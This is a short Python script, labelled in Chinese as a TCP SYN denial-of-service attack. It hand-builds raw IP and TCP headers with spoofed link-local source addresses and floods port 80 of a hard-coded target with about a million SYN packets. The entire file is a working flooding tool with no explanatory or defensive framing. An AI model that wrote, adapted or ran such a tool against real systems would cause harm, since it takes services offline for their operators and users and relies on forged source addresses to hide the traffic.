#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""DoS 攻击 - TCP SYN"""

import socket
import sys
from struct import *


def makeChecksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]))
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s


def makeIPHeader(sourceIP, destIP):
    version = 4
    ihl = 5
    ihlVersion = (version << 4) + ihl
    typeOfService = 0
    totalLength = 20 + 20
    id = 999
    flagsOffSet = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    headerChecksum = 0
    sourceAddress = socket.inet_aton(sourceIP)
    destinationAddress = socket.inet_aton(destIP)

    return pack('!BBHHHBBH4s4s',
                ihlVersion,
                typeOfService,
                totalLength,
                id,
                flagsOffSet,
                ttl,
                protocol,
                headerChecksum,
                sourceAddress,
                destinationAddress)


def makeTCPHeader(port, icheckSum="none"):
    sourcePort = port
    destinationAddressPort = 80
    SeqNumber = 0
    AckNumber = 0
    dataOffset = 5
    flagFin = 0
    flagSyn = 1
    flagRst = 0
    flagPsh = 0
    flagAck = 0
    flagUrg = 0

    window = socket.htons(5840)

    if icheckSum == "none":
        checksum = 0
    else:
        checksum = icheckSum

    urgentPointer = 0
    dataOffsetResv = (dataOffset << 4) + 0
    flags = (flagUrg << 5) + (flagAck << 4) + (flagPsh << 3) + (flagRst << 2) + (flagSyn << 1) + flagFin
    return pack('!HHLLBBHHH',
                sourcePort,
                destinationAddressPort,
                SeqNumber,
                AckNumber,
                dataOffsetResv,
                flags,
                window,
                checksum,
                urgentPointer)


s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

for j in range(1,20):
    for k in range(1,255):
        for l in range(1,255):
            sourceIP = "169.254.%s.%s" % (k, l)
            destIP = "169.254.27.229"

            ipHeader = makeIPHeader(sourceIP, destIP)
            tcpHeader = makeTCPHeader(10000 + j + k + l)

            sourceAddr = socket.inet_aton(sourceIP)
            destAddr = socket.inet_aton(destIP)

            placeholder = 0
            protocol = socket.IPPROTO_TCP
            tcpLen = len(tcpHeader)
            psh = pack('!4s4sBBH', sourceAddr, destAddr, placeholder, protocol, tcpLen)
            psh = psh + tcpHeader
            tcpChecksum = makeChecksum(psh)
            tcpHeader = makeTCPHeader(10000 + j + k + l, tcpChecksum)
            packet = ipHeader + tcpHeader
            s.sendto(packet, (destIP, 0))
